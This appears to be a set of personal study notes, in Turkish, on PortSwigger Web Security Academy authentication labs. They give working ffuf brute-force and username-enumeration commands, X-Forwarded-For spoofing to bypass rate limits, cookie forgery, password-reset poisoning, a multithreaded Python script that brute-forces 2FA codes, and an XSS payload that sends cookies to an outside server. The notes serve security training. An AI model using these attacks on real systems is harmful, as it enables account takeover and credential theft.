# Lab1 

Burada brute-force ile username enumeration yapıyoruz.
Sistem kullanıcı adının sisteme kayıtlı olduğu bilgisini sızdırıyor.

[[Ffuf]] toolunu kullanarak :

```bash title:"payload"
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=1" -u https://0ad1004e03366db781536c8a0022003b.web-security-academy.net/login -fs 3142 
```

payload'ı ile username i bulabilirsin sonrasında yine aynı payload ile şifreyi brute-force edebilrsin.
# Lab2 (2FA)

- Your credentials: `wiener:peter`
- Victim's credentials `carlos:montoya`

diğer hesaba girerken `/login2` endpointinde `2fa` kontrol ediyor doğruysa  beni `/my-account?id=wiener` e yönlediriyor  login2 kısmına girdikten sonrasında direk `/my-account?id=carlos` girersem bypass ediyorum

# Lab3 (Pass Reset)

Pass reset yaparken kullanıcı idsini alıyor 
# Lab4 ()

```bash
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=11111" -u https://0a7f005f04b732ca81cec53900c50056.web-security-academy.net/login -fr "Invalid username or password\."
```
Bu payloadı kullanarak içerisinde `"Invalid username or password." `bulunan responseları filtrelersin. 
içerisinde `"Invalid username or password"` bulunan löpçük diye ortaya çıkar.

## Lab5(username enumeration with delay)
###### **PİTCHFORK**
Bu labda bize bir hesap vermiş denemelerde kendi hesabına girerken password kısmını uzun bir değer girilirse gecikme oluştuğu bilinmeyen bir username ile denenirse gecikme olmadığı gözüküyor. 

Önlem olarak ip adresine göre bir deneme hakkı belirlenmiş bunu ise `X-Forwarded-for` headerına göre bir engelleme sunuyor bu yüzden brute force atarken buradaki değişkeni sürekli değişmesi gerekiyor. 
Bu değişkenin değişmesi için pitchfork attack uygulanması daha mantıklı her ip değeri için bir username denememize yarıyor.

payload -> 

- `asd.json` içerisindeki responseların durationına göre bir sıralama yapıyrouz burada alpha usernameinde bir gecikme olduğunu görüyoruz.

```bash
ffuf -w usernames:USER -w ip:IP -H "X-forwarded-for:IP" -d "username=USER&password=asdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasd" -u https://0a1600790379fd6481cc16ce005900d4.web-security-academy.net/login -X POST -mode pitchfork -v -o asd.json
```

```bash
ffuf -w passwords:PASS -w ip:IP -H "X-forwarded-for:IP" -d "username=alpha&password=PASS" -u https://0a1600790379fd6481cc16ce005900d4.web-security-academy.net/login -X POST -mode pitchfork -v -o asd.json -mc 302
```
![[Pasted image 20250326150404.png]]


## Lab6(Counter Reset)

wiener:peter diye bir hesabımız var 
brute-foorce engellemek için gerçek ip mize bakıyor ama her giriş yaptığımzda bu countu 0 lıyor bu sayede brute-force atabiliyoruz

wordlistimizi her 3. de denk gelecek şekilde değiştirip uyguluyorum


```bash title:"1 threadde her request 0.1 gecikmeli olarak yollanır."
ffuf -w modified_modified_usernames.txt:USER -w modified_passes.txt:PASS -d "username=USER&password=PASS" -X POST -u https://0a10003e0367cbc8994c21ab004f0067.web-security-academy.net/login -mode pitchfork -c -p 0.1 -t 1 -mc 302
```

## Lab7 
```bash
ffuf -w usernames:USER -w deneme:try -d "username=USER&password=test:try" -u https://0ab900f2038e493d8283bf7a00740089.web-security-academy.net/login -X POST -fr "Invalid username or password" 
```

eğer ki geçerli bir hesaba 5 den fazla giriş denemesi yaparsan "You have made too many incorrect login attempts. Please try again in 1 minute(s)."gibi bir mesaj dönüyor bu yüzden yukarıdaki payload ile o hesapları buluyoruz `deneme` dosyasında 1 den 5 e kadar sayılar var
![[Pasted image 20250326181456.png]]

## Lab8 (2FA)

2FA kısmına bir `brute-force` denedim

## Lab9 (stay-logged-in)

stay logged in olabilmek için bize bir id oluşturuluyor bu id yi base 64 decode ettiğimiz zaman kullanıcı adımızı ve : ile şifremizin md5 hashlenmiş halini buluyoruz elimizdeki şifreleri md5 edip başına carlos : koyup sonra base64 ile encode ederek bir wordlist oluşturuyoruz bu id leri cookie içerisine ekleyip login olup olamadığımıza göre bir filtreleme yapıyoruz

```bash
ffuf -w md5_hashes.txt -b "stay-logged-in=FUZZ; session=ad" -u https://0a5a0060034dcb649a9c849500b30004.web-security-academy.net/my-account?id=carlos -mr "carlos"
```

## Lab 10 (XSS) 

Labın içerisindeki postlarda stored XSS açığı var ve `stay-logged-ing` cookiesinde `http-only` olarak işaretlenmemiş bu sayede 
```HTML title:"XSS no CORS fetch"
<script>
  fetch('https://myserver.com/exploit?' + 'document.cookie', {
  method: 'POST',
  });
</script>
```
injecte edildiğinde girdiğimiz urlye `stay-logged-in` cookiesi ile bir istek yollar.

bu cookie ile giriş yapabilriz.

## Lab 11 (X-Forwarded-Host)
[[X-Forwarded-]]
`X-Forwarded-Host` başlığı kullanılarak sunucunun host başlığına bakarak `host/forget-password?token=` şeklinde attığı maili yönetmemizi sağlar. 
`X-Forwarded-Host` başlığını kendi server adresimizi verirsek maildeki link bizim sunucumuzu gösterir. Eğer hesap sahibi mailindeki linke tıklar ise sunucu loglarında `/forget-password?token={token}` şeklinde bir istek düşer.
Bu token kullanılarak diğer hesabın şifresi değiştilebilir.

## Lab 12 (change-password)
`Current password `değerini kontrol ediyor doğru değilse "`Current password is incorrect`" dönüyor username değeri ve değiştirilecek şifreyi alıyor ancak farklı bir hesapla giriş yapılırsa yani session değeri username in değilse değiştirme işlemini yapmıyor. Session değerini de dahil ederek brute-force atılması gerekiyor password1 ve password2 değerlerinin de farklı olması gerekiyor aynı olursa da kabul etmiyor.

payload:
```bash
ffuf -w passwords -u https://0a0a005504429c3f818fca58003000c1.web-security-academy.net/my-account/change-password -d "username=carlos&current-password=FUZZ&new-password-1=asd&new-password-2=peter" -b "session=UEEMqscwXcd1Njz56APbopsW3zQ1qefO" -fr "Current password is incorrect"
```

## Lab 13 (Json)
Json verisi içerisinde bir dizi verdim ve sunucu bu dizideki tüm şifreleri denedi giriş yaptı ve yönlendirdi.

## Lab 14 ()
![[Pasted image 20250329051300.png]]

tablo bu şekilde olmalı sırasıyla istekler atılarak brute force denenmeli bunu yapan python kodu : 

```python
import requests

from bs4 import BeautifulSoup

import threading

import time

from concurrent.futures import ThreadPoolExecutor

  

# URL ve oturum

url = "https://0a3e00730439aa2d83e58c06007200e5.web-security-academy.net"

session = requests.Session()

found_code = None

lock = threading.Lock()  # Thread güvenliği için kilit mekanizması

  

# CSRF token'ı almak

def get_csrf_token(response):

    soup = BeautifulSoup(response.text, "html.parser")

    csrf_token = soup.find("input", {"name": "csrf"})["value"]

    return csrf_token

  

# Login işlemi ve MFA kodu denemesi

def try_mfa_code(mfa_code):

    global found_code

    # Eğer kod zaten bulunduysa diğer thread'lerin çalışmasını durdur

    if found_code:

        return

    try:

        local_session = requests.Session()

        login_response = local_session.get(url+"/login")

        login_csrf_token = get_csrf_token(login_response)

  

        login2_response = local_session.post(url + "/login", data={

            "username": "carlos",

            "password": "montoya",

            "csrf": login_csrf_token

        })

        login2_csrf_token = get_csrf_token(login2_response)

  

        last_response = local_session.post(url + "/login2", data={

            "mfa-code": str(mfa_code).zfill(4),  # 4 haneli formatta gönder

            "csrf": login2_csrf_token

        })

        print(f"MFA kodu denendi: {mfa_code}")
        if last_response.status_code == 302 or "carlos" in last_response.text :
            with lock:
                found_code = mfa_code
                cookies_dict = local_session.cookies.get_dict()
                success_info = {
                    "message": f"Doğru kod bulundu: {mfa_code}",
                    "url": url,
                    "cookies": cookies_dict,
                    "session": local_session
                }
                print(f"Doğru kod bulundu: {mfa_code}")
                print("URL:", url)
                print("Cookies:", cookies_dict)

    except Exception as e:
        print(f"Hata oluştu ({mfa_code}): {str(e)}")


# Multi-threading işlemi

def main():

    # MFA kodlarını oluştur (1000-9999)

    codes = list(range(1000, 10000))

    # ThreadPoolExecutor ile aynı anda sadece 5 thread çalıştır

    with ThreadPoolExecutor(max_workers=500) as executor:

        for result in executor.map(try_mfa_code, codes):

            # Eğer doğru kod bulunduysa işlemi durdur

            if found_code:

                executor._threads.clear()

                break

  

if __name__ == "__main__":

    main()
```